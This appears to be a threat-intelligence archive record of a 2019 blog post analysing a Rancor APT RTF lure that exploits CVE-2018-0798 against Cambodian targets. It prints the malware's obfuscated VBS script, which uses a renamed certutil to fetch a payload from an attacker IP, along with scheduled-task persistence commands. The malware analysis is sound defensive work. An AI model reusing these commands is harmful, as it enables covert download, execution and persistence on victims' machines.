{
    "id": "d60c1f2c-4a3a-456a-9f54-a4f094047605",
    "created_at": "2022-10-25T16:48:18.339837Z",
    "updated_at": "2025-03-27T02:13:44.628705Z",
    "deleted_at": null,
    "sha1_hash": "a873e9f1ba1904911a92497f949b9b10c701d931",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-09-12T08:33:18Z",
    "file_modification_date": "2019-09-12T08:33:18Z",
    "file_size": 714601,
    "plain_text": "# 09/11/2019 - RANCOR APT: Suspected targeted attacks against South East Asia\n\n**meltx0r.github.io/tech/2019/09/11/rancor-apt.html**\n\nMeltX0R Security September 11, 2019\n\n## Summary\n\nRancor - a Chinese APT identified by PaloAlto in 2017 has recently been observed targeting\nSouth East Asia using RTF’s containing CVE-2018-0798. They are believed to have goals of\nespionage. In this post I review a recently created RTF document used to lure and target South\nEast Asian entities.\n\n## Analysis\n\nWhile conducting research I came across an RTF document on VirusTotal, which was created on\n2019-08-28 at 00:35:00 and uploaded on 2019-09-11 at 08:48:41. Initial review of this RTF\nrevealed highly suspect activity consistent with APT lures that I have observed in the past.\n\nUpon opening the RTF document you are presented with a list of names written in Khmer, the\nofficial language of Cambodia, and spoken throughout South East Asia. The content of the\ndocument, when translated, attempts to appear as if it was sent by the Cabinet of Cambodia and\nlists out names of various government officials.\n\n\n-----\n\nShown above: Rancor RTF Lure\n\nWhilst reviewing this “official” looking document, CVE-2018-0798 is being executed in the\nbackground. CVE-2018-0798 is an RCE vulnerability which allows a stack buffer overflow that\ncan be exploited by a threat actor to perform stack corruption. In July 2019, Anomali wrote a\n[detailed article on this exploit and how they observed multiple Chinese threat groups utilizing it to](https://www.anomali.com/blog/multiple-chinese-threat-groups-exploiting-cve-2018-0798-equation-editor-vulnerability-since-late-2018)\ncompromise their targets (including Rancor). This allows the attackers to create the file\n“OSEA54d.tmp” in the “C:\\Users[username]\\AppData\\Local\\Temp\" folder and execute it.\n\n\n-----\n\ncertificate authority information and configure Certificate Services. It can also be used for\nnefarious purposes, such as downloading files from a given URL. Next, OSEA54d.tmp creates a\n.vbs script in the same folder, titled “Photo.vbs”.\n\nShown below: Photo.vbs script\n\nwscript.sleep 3000:wscript.createobject(\"wscript.shell\").run\n\"%windir%\\system32\\spool\\drivers\\color\\GoogleUpdate.exe -f -u\"\"rlca\"\"che\n\"\"h\"\"tt\"\"p\"\":/\"\"/167.71.237.100/%ComputerName%.png\"\" %temp%\\%ComputerName%.tmp\",0,0\n\nStepping through this script, we can break it down to two parts - first it calls “wscript.sleep” which\ncauses it to suspend the execution of the script for a specified number of milliseconds (in this\ncase, 3000). Second, we see it call “wscript.createobject(“wscript.shell”).run”, which allows you to\nrun a cmdline command from a .vbs script. This runs GoogleUpdate.exe, which we previously\nidentified as CertUtil.exe, with the -f and -urlcache flags to force fetch a specified URL and update\nthe cache. The URL provided (167.71.237.100/%ComputerName%.png) requests a file based off\nthe user’s computer name (i.e. USER-PC), which is then stored in the user’s local temp folder as\na .tmp file.\n\nNext, I observed OSE91E4.tmp launch two child cmd.exe processes with the following\nparameters:\n\nShown below: “Google-Updates” scheduled task\n\ncmd /c schtasks /create /sc MINUTE /tn \"Google-Updates\" /tr \"msiexec /q /i\n%temp%\\%ComputerName%.tmp\" /mo 3 /F\n\nThe first cmd.exe calls schtasks to create a scheduled task called “Google-Updates”, which\nutilizes “msiexec” to execute the downloaded payload “[ComputerName].tmp” from the user’s\nlocal temp folder once every minute. This would be used to maintain persistence once the\nsecondary payload was downloaded.\n\nShown below: “Google-Update” scheduled task\n\ncmd /c schtasks /create /sc MINUTE /tn \"Google-Update\" /tr \"wscript /b\n%windir%\\system32\\spool\\drivers\\color\\Photo.vbs\" /mo 2 /F\n\nThe second cmd.exe calls schtasks to create a scheduled task called “Google-Update” (note the\nmissing “s” in comparison to the prior scheduled task. Due to the /F flag, even if they had identical\nnames, it would forcefully create the task and suppresses warnings if the specified task already\nexisted). This utilizes wscript to run “Photo.vbs” from the user’s local temp folder once every\nminute.\n\n\n-----\n\nShown above: Process graph\n\nUnfortunately, whenever a secondary payload was requested from the URL\n“167.71.237.100/[ComputerName].png” containing my computer’s name (USER-PC), regardless\nof geolocation, it returned 404 Not Found HTTP responses. That indicates several possibilities to\nme - such as the attackers already knowing the computer name of their target and only returning\na payload if it is matched, specific geolocation requirements, or the file was removed from the\nserver.\n\n\n-----\n\nDue to the final payload not being available for analysis, I was unable to compare prior samples\nof malware used by Rancor to confirm attribution - however, based on the TTP’s (Tactics,\nTechniques, Procedures) observed, I can say with a high degree of confidence that this activity is\nrelated to Rancor APT. Therefore, the final payload would have likely been DDKONG or\nPLAINTEE malware which serve as backdoors, allowing the actors to list files, upload/download\nfiles, and execute other commands.\n\n## Translated RTF Lure\n\n\n-----\n\nOffice of the Council of Ministers\nFrom Head of Department to Director General\nA. General Department of Administration and Finance\n1. HE Chhum Thong, Director General\n2. HE Binny Tiara, Deputy Director General\n3. Mr. Kim Sung, Deputy Director General\n4. Mr. Yim Roulli, Director of Administration Department\n5. Sorn Seth, Head of Supply and Finance Department\n6. Mr. Sam Bunna, Head of Personnel Department\n7. Mrs. Hak Porleang, Head of Protocol Department\nB. General Department of General Affairs\n1. Mr. Oum Sambath, Acting Director General\n2. Deputy Prime Minister Yim Sokunthy\n3. Mr. Heng studied Deputy Director\n4. The Deputy Director General\n5. Mr. Phuang Construction Deputy Director General\n6. Soth Thy, Head of Electronic and Information Technology Department\n7. Mr. Van Mony Sovann, Head of Total Department\n8. Mr. So Seyha, Head of Department of Excellence\n9. Mr. Kheang Seng, Acting Head of Department, Department of Cabinet Plenary and other\nmeetings\n10. Miss. Kim Marian, Acting Director, Research and Documentation Support Meeting\n\nC. General Department of International Cooperation\n1. Her Excellency Hean Polynes, General Director in addition to the Vice President\nCambodian Human Rights Committee\n2. Keo Kannarith, Deputy Director General\n3. Mr. Tuy Sina, Deputy Director General\n4. Hem Oum Sithiel, Head of International Relations Department\n5. Pa. Panna Radar, Acting Director of the ASEAN Department\nD. Directorate General for Internal Affairs\n1. Mr. Sao Phalla, Director General\n2. HE Sarun Rady, Deputy Director General\n3. Mr. Ung Chanthou, Deputy Director General\n4. Ms. Pich Channary, Deputy Director General\n5. Mr\n6. Rith Arunithya, Director of the Department of the Interior, Defense, Justice and the\nConstitutional Institution\n7. Mr. Heng Sok is Director of Department of Public Works and Relations with the National\nAssembly, Senate and Inspection\n8. Meas Men, Head of Department of Information, Posts and Telecommunications\nE. Department of Economy and Tourism\n1. Youk Chhang, Director General\n2. Seng Vannath, Deputy Director General\n3. Mrs. Svay Nary, Deputy Director General\n4. HE Phat Salin, Deputy Director General\n5. Mr.Ratt Sok is the Head of Finance and Banking Department\n6. Mr. Iv Reth heads the Department of Industry, Mineral and Energy\n7. Ty, Director of the Department of Commerce and Tourism\n8. Lim Kithya, Director of Planning and Development Department\nF. General Department of Social Affairs\n1. Mr. Thong Sokun, Director General\n2. Von Sothun, Deputy Director General\n3. Mr. Seng Sin, Deputy Director General\n4. Mr. Sok Daravuth, Deputy Director General\n5. Heidi Dinar, Head of Department of Education, Culture, Cult and Religion\n6. Mr. Chea Phally, Director of Department of Health, Social Affairs and Women's Affairs\nG General Department of Production, Land Management, Urban Planning and Construction\n1. HE Long Sokha, Director General\n\n\n-----\n\n6. Hak Seila, Director of Department of Rural Development, Public Works and Transport\n7. Ms.\nNeth Chhunny, acting director of the Department of Land Management, Urban Planning,\nConstruction and Environment\nJ General Department of Civil Affairs and National Archives\n1. HE Ngin Phalroth, Director General\n2. Mr. Four Hing Sothy, Deputy Director General\n3. Seng Manrith, Deputy Director General\n4. Mr. Suos Visoth, Deputy Director General\n5. Ms. Sovann Sovanna, Head of Department of Government\n6. Mrs. Dary, Head of the National Archives Department\nI. Department of Internal Audit\nMak Thearith, Head of Internal Audit Department\n\nShown above: Translation of the content within the RTF.\n\n## Indicators\n\nIndicator Type Description\n\n\n5e8b469d36e8d4b9c0\n0c67bbba1af382\n\nfa2a3369e6d17b44ce0\n66035c0ef8c56\n\n\nMD5 Hash of an RTF document used by Rancor APT\n\nMD5 Hash of OSEA54D.tmp\n\n\n167.71.237.100 IP\nAd‐\ndress\n\n\nIP Address used by Rancor APT to serve a second stage pay‐\nload, likely DDKONG or PLAINTEE malware\n\n\n## References/Further Reading\n\n1. https://unit42.paloaltonetworks.com/unit42-rancor-targeted-attacks-south-east-asia-using\nplaintee-ddkong-malware-families/\n2. https://www.anomali.com/blog/multiple-chinese-threat-groups-exploiting-cve-2018-0798\nequation-editor-vulnerability-since-late-2018\n3. https://attack.mitre.org/groups/G0075/\n4. https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0798\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.09.11.RANCOR_APT/RANCOR%20APT_%20Suspected%20targeted%20attacks%20against%20South%20East%20Asia.pdf"
    ],
    "report_names": [
        "RANCOR APT_ Suspected targeted attacks against South East Asia"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "416f8374-2b06-47e4-ba91-929b3f85d9bf",
            "created_at": "2022-10-25T16:07:24.093951Z",
            "updated_at": "2025-03-27T02:02:10.105752Z",
            "deleted_at": null,
            "main_name": "Rancor",
            "aliases": [
                "Rancor Group",
                "Rancor Taurus"
            ],
            "source_name": "ETDA:Rancor",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "DDKONG",
                "Derusbi",
                "Dudell",
                "ExDudell",
                "KHRAT",
                "PLAINTEE",
                "RoyalRoad",
                "certutil",
                "certutil.exe",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e8aee970-e31e-489f-81c2-c23cd52e255c",
            "created_at": "2023-01-06T13:46:38.763687Z",
            "updated_at": "2025-03-27T02:00:02.91243Z",
            "deleted_at": null,
            "main_name": "RANCOR",
            "aliases": [
                "Rancor",
                "Rancor Group",
                "G0075",
                "Rancor Taurus",
                "Rancor group"
            ],
            "source_name": "MISPGALAXY:RANCOR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6d11e45c-4e31-4997-88f5-295b2564cfc6",
            "created_at": "2022-10-25T15:50:23.794721Z",
            "updated_at": "2025-03-27T02:00:55.548806Z",
            "deleted_at": null,
            "main_name": "Rancor",
            "aliases": [
                "Rancor"
            ],
            "source_name": "MITRE:Rancor",
            "tools": [
                "DDKONG",
                "PLAINTEE",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041624,
    "ts_creation_date": 1568277198,
    "ts_modification_date": 1568277198,
    "files": {
        "pdf": "https://archive.orkl.eu/a873e9f1ba1904911a92497f949b9b10c701d931.pdf",
        "text": "https://archive.orkl.eu/a873e9f1ba1904911a92497f949b9b10c701d931.txt",
        "img": "https://archive.orkl.eu/a873e9f1ba1904911a92497f949b9b10c701d931.jpg"
    }
}